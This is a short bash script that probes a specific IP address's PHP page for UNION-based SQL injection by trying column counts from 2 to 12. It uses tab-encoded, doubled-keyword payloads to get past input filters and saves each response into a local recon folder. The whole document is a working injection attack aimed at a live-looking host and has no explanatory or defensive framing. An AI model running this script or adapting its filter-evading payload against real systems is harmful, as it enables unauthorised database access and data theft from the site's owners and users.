#!/bin/bash
# Brute force column count
for n in 2 3 4 5 6 7 8 9 10 11 12; do
  cols=$(seq -s, 1 $n)
  curl -s "http://8.140.206.93:81/vulnerabilities/fu1.php?id=-1')%09uniunionon%09select%09${cols}%23" > /home/kali/桌面/hack/8.140.206.93/recon/union-cols-${n}.html
  size=$(wc -c < /home/kali/桌面/hack/8.140.206.93/recon/union-cols-${n}.html)
  echo "Cols $n: $size bytes"
done
